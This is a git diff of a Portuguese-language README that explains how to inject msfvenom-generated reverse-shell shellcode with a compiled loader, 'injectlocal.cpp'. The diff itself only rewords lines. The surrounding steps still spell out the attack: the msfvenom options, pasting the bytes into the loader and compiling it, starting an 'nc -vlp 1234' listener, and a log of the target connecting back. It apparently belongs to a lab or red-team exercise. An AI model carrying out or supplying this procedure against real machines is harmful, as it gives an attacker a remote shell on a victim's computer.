@@ -74,7 +74,8 @@ LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 injectlocal.cpp
 ```
 
-- Depois de copiar os bytes gerados pelo msfvenom no Step 1, devemos colar esses bytes no conteúdo da variável *unsigned char shellcode[] = ""* do código 'injectlocal.cpp' e depois compilar-lo.
+- Copiar os bytes gerados pelo msfvenom no Step 1,
+em seguinda devemos colar esses bytes no conteúdo da variável *unsigned char shellcode[] = ""* do código 'injectlocal.cpp' e depois compilar-lo.
 
 - Ao compilar o software com sucesso teremos o executável pronto para uso.
 
@@ -86,15 +87,18 @@ injectlocal.exe
 #### Step 3
 
 
-- Abrir a porta que colocamos como argumento no msfvenom para gerar o shellcode, no computador que tem o IP que também colocamos como argumento no msfvenom para gerar o shellcode 
+- Abrir a porta que colocamos como argumento no msfvenom para gerar o shellcode, no computador com o IP que também colocamos como argumento no msfvenom para gerar o shellcode 
 
-```cmd
+```bash
 nc -vlp 1234
 ```
 
-- Então assim que o binário que injeta o shellcode for executado, devemos ganhar o acesso no alvo.
+- Então assim que o binário compilado para injetar o
+shellcode for executado, devemos ganhar o acesso no
+alvo.
 
-```DOS
+
+```bash
 listening on [any] 1234 ...
 192.168.10.109: inverse host lookup failed: Host name lookup failure
 connect to [192.168.10.113] from (UNKNOWN) [192.168.10.109] 49173
